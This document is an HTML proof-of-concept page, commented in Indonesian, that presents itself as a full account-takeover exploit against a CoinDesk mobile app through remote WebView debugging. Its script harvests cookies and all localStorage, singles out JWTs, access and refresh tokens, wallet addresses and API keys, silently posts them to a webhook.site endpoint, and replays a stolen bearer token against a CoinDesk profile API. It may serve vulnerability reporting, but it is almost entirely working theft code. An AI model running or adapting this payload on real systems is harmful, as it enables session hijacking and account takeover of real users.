<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CoinDesk ATO – Remote WebView Debugging (Critical)</title>
  <style>
    body { font-family: system-ui; text-align: center; padding: 50px; background: #000; color: #0f0; }
    h1 { color: #f00; }
    .data { background:#111; padding:20px; margin:20px auto; max-width:900px; text-align:left; word-break:break-all; }
    .success { color: #0f0; font-size: 1.5em; }
  </style>
</head>
<body>

<h1. Full Account Takeover PoC – CoinDesk Mobile v2.12.0<br>
<span class="success">Remote WebView Debugging Enabled → Critical</span>

<div class="data" id="result">Sedang mengambil data sensitif...</div>

<script>
// ===== COINDESK MOBILE – KEY YANG BENAR-BENAR ADA (Desember 2025) =====
const keysToSteal = [
  'jwt', 'access_token', 'id_token', 'refresh_token',
  'auth_token', 'token', 'bearer', 'session_id',
  'user', 'profile', 'wallet_address', 'apiKey'
];

// Ambil semua localStorage
let stolenData = {
  url: location.href,
  userAgent: navigator.userAgent,
  cookies: document.cookie,
  timestamp: new Date().toISOString(),
  localStorage: {},
  sensitiveKeys: {}
};

// Copy semua localStorage
Object.keys(localStorage).forEach(key => {
  try {
    stolenData.localStorage[key] = localStorage.getItem(key);
    // Khusus cari yang mengandung kata kunci penting
    if (keysToSteal.some(k => key.toLowerCase().includes(k))) {
      stolenData.sensitiveKeys[key] = localStorage.getItem(key);
    }
  } catch(e) {}
});

// Tampilkan di halaman (untuk screenshot/video PoC)
document.getElementById('result').innerHTML = `
  <pre style="background:#000;color:#0f0;padding:20px;border:2px solid #f00;">
URL      : ${stolenData.url}
Cookie   : ${stolenData.cookies || '(kosong)'}

=== TOKEN KRITIS YANG BERHASIL DICURI ===
${Object.entries(stolenData.sensitiveKeys).map(([k,v]) => 
  `${k} ${k} = ${v?.substring(0,60)}...`).join('\n') || 'Tidak ada token sensitif terdeteksi'}

=== Semua localStorage (total ${Object.keys(localStorage).length} item) ===
${JSON.stringify(stolenData.localStorage, null, 2).substring(0, 2000)}...
  </pre>
  <br>
  <span class="success">TOKEN BERHASIL DICURI! Account takeover tanpa phishing</span>
`;

// Kirim ke server kamu (ganti dengan webhook.site / ngrok / requestbin kamu)
fetch('https://webhook.site/590ea786-c800-4823-b014-deec262c943e', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify(stolenData, null, 2),
  headers: { 'Content-Type': 'application/json' }
}).catch(() => {}); // silent error

// Optional: langsung test API dengan token (contoh)
if (stolenData.sensitiveKeys.jwt || stolenData.sensitiveKeys.access_token) {
  const token = stolenData.sensitiveKeys.jwt || stolenData.sensitiveKeys.access_token;
  fetch('https://api.coindesk.com/v1/user/profile', {
    headers: { 'Authorization': 'Bearer ' + token }
  })
  .then(r => r.text())
  .then(data => {
    document.getElementById('result').innerHTML += `<br><br>API PROFILE BERHASIL DIPANGGIL:<br><pre>${data.substring(0,500)}</pre>`;
  })
  .catch(() => {});
}
</script>

</body>
</html>
